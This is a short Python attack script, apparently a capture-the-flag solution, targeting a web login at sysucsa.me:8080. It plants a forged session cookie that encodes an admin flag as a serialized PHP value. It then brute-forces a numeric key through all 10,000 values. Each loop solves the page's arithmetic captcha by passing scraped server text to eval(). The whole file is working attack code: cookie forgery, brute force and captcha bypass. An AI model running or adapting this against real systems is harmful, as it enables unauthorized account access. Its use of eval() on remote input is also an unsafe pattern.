import requests
import re

url = 'http://sysucsa.me:8080'

s = requests.session()
s.cookies['sess'] = 'YToxOntzOjU6ImFkbWluIjtiOjE7fQ=='
s.cookies['PHPSESSID'] = 'ccfa9e9dae2f01fda3e6f1e4bf8c7f2c'

for i in range(0, 10000):
    print(i)
    question = re.search('placeholder=(.*\+.*)>', s.get(url).text).group(1)
    answer = eval(question)
    if 'Your key is not correct.' not in s.post(url, data={'key': i, 'captcha': answer}).text:
        break
